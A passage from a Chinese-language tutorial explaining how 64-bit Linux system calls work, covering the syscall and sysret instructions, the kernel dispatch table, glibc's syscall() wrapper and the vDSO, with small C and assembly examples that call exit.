&lt;p&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/cpu/common.c#L1128&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/cpu/common.c&lt;/code&gt;&lt;/a&gt; 可以找到相关代码:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;syscall_init&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* ... other code ... */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        wrmsrl(MSR_LSTAR, system_call);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;MSR_LSTAR&lt;/code&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/uapi/asm/msr-index.h#L9&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/include/uapi/asm/msr-index.h&lt;/code&gt;&lt;/a&gt;定义为 0xc0000082。&lt;/p&gt;
&lt;p&gt;类似传统软件中断型的系统调用, 使用&lt;code&gt;syscall&lt;/code&gt;触发系统调用时也定义了一些规范。&lt;/p&gt;
&lt;p&gt;用户程序需要将系统调用号写入&lt;code&gt;rax&lt;/code&gt;寄存器中。系统调用的参数要c传入通用寄存器中。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.x86-64.org/documentation/abi.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;x86-64 ABI &lt;/a&gt;章节A.2.1 对此有所描述:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9.
2. A system-call is done via the syscall instruction. The kernel destroys registers %rcx and %r11.
3. The number of the syscall has to be passed in register %rax.
4. System-calls are limited to six arguments,no argument is passed directly on the stack.
5. Returning from the syscall, register %rax contains the result of the system-call. A value in the range between -4095 and -1 indicates an error, it is -errno.
6. Only values of class INTEGER or class MEMORY are passed to the kernel.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L569-L591&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/entry_64.S&lt;/code&gt;&lt;/a&gt;的注释中也有相关介绍。&lt;/p&gt;
&lt;p&gt;现在我们已经知道了如何执行系统调用以及如何传递这些参数，开始着手写一些内联汇编代码。&lt;/p&gt;
&lt;h4 id=&quot;自己写汇编使用syscall&quot;&gt;&lt;a href=&quot;#自己写汇编使用syscall&quot; class=&quot;headerlink&quot; title=&quot;自己写汇编使用syscall&quot;&gt;&lt;/a&gt;自己写汇编使用syscall&lt;/h4&gt;&lt;p&gt;基于前面介绍的例子，我们开始着手编写一小段含有内联汇编的C程序，代码中执行&lt;code&gt;exit&lt;/code&gt;系统调用并传递退出状态：42.&lt;/p&gt;
&lt;p&gt;首先，我们要找到&lt;code&gt;exit&lt;/code&gt;的系统调用号。在这个例子中，我们需要从&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_64.tbl#L69&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/syscalls/syscall_64.tbl&lt;/code&gt;&lt;/a&gt;中读取这张表：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;60 common exit sys_exit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;exit&lt;/code&gt;的系统调用号是60. 根据前文介绍，我们只需将60写入&lt;code&gt;eax&lt;/code&gt;寄存器，以及第一个参数(退出状态)写入&lt;code&gt;rdi&lt;/code&gt;寄存器。&lt;/p&gt;
&lt;p&gt;请看下面这段含有内联汇编的C代码。类似前面的例子，从清晰度来看，冗余的文字可能比代码本身更重要。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; syscall_nr = &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; exit_status = &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;movq %0, %%rax\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;string&quot;&gt;&quot;movq %1, %%rdi\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;string&quot;&gt;&quot;syscall&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* output parameters, we aren&#39;t outputting anything, no none */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;/* (none) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* input parameters mapped to %0 and %1, repsectively */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (syscall_nr), &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (exit_status)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* registers that we are &quot;clobbering&quot;, unneeded since we are calling exit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;rax&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;rdi&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来，编译，执行，然后检查退出状态:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gcc -o test test.c
$ ./test
$ echo $?
42
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功了! 我们利用&lt;code&gt;syscall&lt;/code&gt;系统调用方式来触发&lt;code&gt;exit&lt;/code&gt;系统调用。避免了软件中断，如果我们要用micro-benchmark 来计算时间的话，这种方法执行起来要快许多。&lt;/p&gt;
&lt;h4 id=&quot;内核层面：syscall入口&quot;&gt;&lt;a href=&quot;#内核层面：syscall入口&quot; class=&quot;headerlink&quot; title=&quot;内核层面：syscall入口&quot;&gt;&lt;/a&gt;内核层面：syscall入口&lt;/h4&gt;&lt;p&gt;现在我们已经知道了如何从用户程序中触发系统调用。接下来就要介绍内核如何利用系统调用号执行系统调用中的代码。&lt;/p&gt;
&lt;p&gt;回想前文，我们知道如何将&lt;code&gt;system_call&lt;/code&gt;函数的地址写入&lt;code&gt;LSTAR&lt;/code&gt; MSR中。&lt;/p&gt;
&lt;p&gt;下面就来看看这个函数中的代码是如何利用&lt;code&gt;rax&lt;/code&gt;寄存器将执行环境切换到系统调用中的。可以参考&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L629&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/entry_64.S&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;call *sys_call_table(,%rax,8)  # XXX:    rip relative
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;类似传统系统调用，&lt;code&gt;sys_call_table&lt;/code&gt;一张在C文件中定义的表，其利用&lt;code&gt;#include&lt;/code&gt;将脚本产生的C代码包含进来。&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/syscall_64.c#L25-L32&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/syscall_64.c&lt;/code&gt;&lt;/a&gt;,注意底部的&lt;code&gt;#include&lt;/code&gt;:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;asmlinkage &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;sys_call_ptr_t&lt;/span&gt; sys_call_table[__NR_syscall_max+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         * Smells like a compiler bug -- it doesn&#39;t work&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         * when the &amp;amp; below is removed.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        [&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; ... __NR_syscall_max] = &amp;amp;sys_ni_syscall,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;&lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt;/syscalls_64.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从前文我们知道，系统调用表定义在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_64.tbl&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/syscalls/syscall_64.tbl&lt;/code&gt;&lt;/a&gt;。与传统中断模式一样，脚本在内核编译的时候执行并通过&lt;code&gt;syscall_64.tbl&lt;/code&gt;文件中的表生成&lt;code&gt;syscalls_64.h&lt;/code&gt;文件。&lt;/p&gt;
&lt;p&gt;上述代码包括能生成系统调用号索引的函数指针数组的C代码。&lt;/p&gt;
&lt;p&gt;以上就是如何通过&lt;code&gt;syscall&lt;/code&gt;系统调用进入内核的全过程。&lt;/p&gt;
&lt;h4 id=&quot;sysret-从syscall中返回&quot;&gt;&lt;a href=&quot;#sysret-从syscall中返回&quot; class=&quot;headerlink&quot; title=&quot;sysret: 从syscall中返回&quot;&gt;&lt;/a&gt;sysret: 从syscall中返回&lt;/h4&gt;&lt;p&gt;内核利用&lt;code&gt;sysret&lt;/code&gt;指令将执行环境恢复到用户程序执行&lt;code&gt;syscall&lt;/code&gt;的地方。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sysret&lt;/code&gt;比起&lt;code&gt;sysexit&lt;/code&gt;来要简单一些，因为当执行&lt;code&gt;syscall&lt;/code&gt;时，需要被恢复执行的地址保存在&lt;code&gt;rcx&lt;/code&gt;寄存器中。&lt;/p&gt;
&lt;p&gt;只要能将这个地址保存起来，并在执行&lt;code&gt;sysret&lt;/code&gt;前将其恢复到&lt;code&gt;rcx&lt;/code&gt;寄存器中，执行环境就能在触发&lt;code&gt;syscall&lt;/code&gt;的地方恢复。&lt;/p&gt;
&lt;p&gt;这种机制比较方便，因为&lt;code&gt;sysenter&lt;/code&gt;却要求你自己在代码中计算这个地址，并将其重写到寄存器中。&lt;/p&gt;
&lt;p&gt;上述代码在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L650-L655&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/entry_64.S&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;movq RIP-ARGOFFSET(%rsp),%rcx
CFI_REGISTER    rip,rcx
RESTORE_ARGS 1,-ARG_SKIP,0
/*CFI_REGISTER  rflags,r11*/
movq    PER_CPU_VAR(old_rsp), %rsp
USERGS_SYSRET64
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中&lt;code&gt;USERGS_SYSRET64&lt;/code&gt;是定义在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L133-L135&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/include/asm/irqflags.h&lt;/code&gt;&lt;/a&gt;中的宏，其中包含&lt;code&gt;sysret&lt;/code&gt;指令。&lt;/p&gt;
&lt;p&gt;好了，目前为止，你已经知道64位系统调用是如何工作的了。&lt;/p&gt;
&lt;h2 id=&quot;syscall-2-半手动调用syscall&quot;&gt;&lt;a href=&quot;#syscall-2-半手动调用syscall&quot; class=&quot;headerlink&quot; title=&quot;syscall(2)半手动调用syscall&quot;&gt;&lt;/a&gt;syscall(2)半手动调用syscall&lt;/h2&gt;&lt;p&gt;太棒了，针对不同系统调用模型，我们已经知道如何编写汇编代码去触发这些系统调用了。&lt;/p&gt;
&lt;p&gt;通常来说，你没必要自己写汇编代码。glibc提供的封装器函数已经为你处理好了所有的汇编代码。&lt;/p&gt;
&lt;p&gt;当然，也有一些系统调用，glibc并没有为其做好封装器。其中一个例子就是&lt;code&gt;futex&lt;/code&gt;–快速用户层上锁系统调用。&lt;/p&gt;
&lt;p&gt;等等，为什么&lt;a href=&quot;http://man7.org/linux/man-pages/man7/futex.7.html#NOTES&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;futex&lt;/code&gt;&lt;/a&gt;没有系统调用封装器呢？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;futex&lt;/code&gt;是为库函数调用准备的，而不是应用程序。因此，要想调用&lt;code&gt;futex&lt;/code&gt;，你必须这样做:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;为你想支持的平台生成汇编存根(stub)&lt;/li&gt;
&lt;li&gt;使用glibc提供的&lt;code&gt;syscall&lt;/code&gt;封装器&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有些时候，如果你想执行那些没有封装器的系统调用，你别无选择，只能利用第二种方法：使用glibc提供的&lt;code&gt;syscall&lt;/code&gt;函数。&lt;/p&gt;
&lt;p&gt;我们试试利用glibc提供的&lt;code&gt;syscall&lt;/code&gt;调用&lt;code&gt;exit&lt;/code&gt;，其退出状态是42:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; syscall_nr = &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; exit_status = &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  syscall(syscall_nr, exit_status);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来，编译，执行，然后检查退出状态:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gcc -o test test.c
$ ./test
$ echo $?
42
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功了！我们利用glibc提供的&lt;code&gt;syscall&lt;/code&gt;封装器成功的调用了&lt;code&gt;exit&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&quot;glibc-syscall封装器内幕&quot;&gt;&lt;a href=&quot;#glibc-syscall封装器内幕&quot; class=&quot;headerlink&quot; title=&quot;glibc syscall封装器内幕&quot;&gt;&lt;/a&gt;glibc syscall封装器内幕&lt;/h3&gt;&lt;p&gt;来看看前面例子中&lt;code&gt;syscall&lt;/code&gt;封装器在glibc中是如何工作的&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/sysv/linux/x86_64/syscall.S#L24-L42&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;sysdeps/unix/sysv/linux/x86_64/syscall.S&lt;/code&gt;&lt;/a&gt;：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/* Usage: long syscall (syscall_number, arg1, arg2, arg3, arg4, arg5, arg6)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   We need to do some arg shifting, the syscall_number will be in&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   rax.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .text&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ENTRY (syscall)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %rdi, %rax         /* Syscall number -&amp;gt; rax.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %rsi, %rdi         /* shift arg1 - arg5.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %rdx, %rsi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %rcx, %rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %r8, %r10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %r9, %r8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq 8(%rsp),%r9        /* arg6 is on the stack.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        syscall                 /* Do the system call.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cmpq $-4095, %rax       /* Check %rax for error.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        jae SYSCALL_ERROR_LABEL /* Jump to error handler if error.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;L(pseudo_end):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ret                     /* Return to caller.  */&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前面我们给出了x86_64 ABI文档的参考链接，其描述了用户层和内核层的调用规范。&lt;/p&gt;
&lt;p&gt;这段汇编stud很酷，因为它同时遵守两种调用规范。传递到这个函数的参数遵守用户层调用规范，但是在转移到另一组不同的寄存器利用&lt;code&gt;syscall&lt;/code&gt;进入内核之前，又遵守内核层规范。&lt;/p&gt;
&lt;p&gt;以上就是在你要执行默认没有封装器的系统调用时，glibc提供的&lt;code&gt;syscall&lt;/code&gt;封装器的工作方式。&lt;/p&gt;
&lt;h2 id=&quot;虚拟系统调用&quot;&gt;&lt;a href=&quot;#虚拟系统调用&quot; class=&quot;headerlink&quot; title=&quot;虚拟系统调用&quot;&gt;&lt;/a&gt;虚拟系统调用&lt;/h2&gt;&lt;p&gt;到目前为止，我们已经介绍了所有进入内核触发系统调用的方法，并演示了如何手动(或者半手动）触发系统调用将系统从用户层切换到内核层。&lt;/p&gt;
&lt;p&gt;倘若程序能触发一些系统调用，而不需要进入到内核呢？&lt;/p&gt;
&lt;p&gt;这就是Linux vDSO存在的原因。Linux vDSO是内核代码的一部分，但是却被映射到用户程序地址空间中在用户层执行。&lt;/p&gt;
&lt;p&gt;这也就是一些系统调用不用进入到内核就能被执行的原因。举个这样的例子: &lt;code&gt;gettimeofday&lt;/code&gt;系统调用。&lt;/p&gt;
&lt;p&gt;程序调用&lt;code&gt;gettimeofday&lt;/code&gt;并不会真正进入到内核。而是简单的调用了内核提供的一小段代码，然后在用户层执行。&lt;/p&gt;
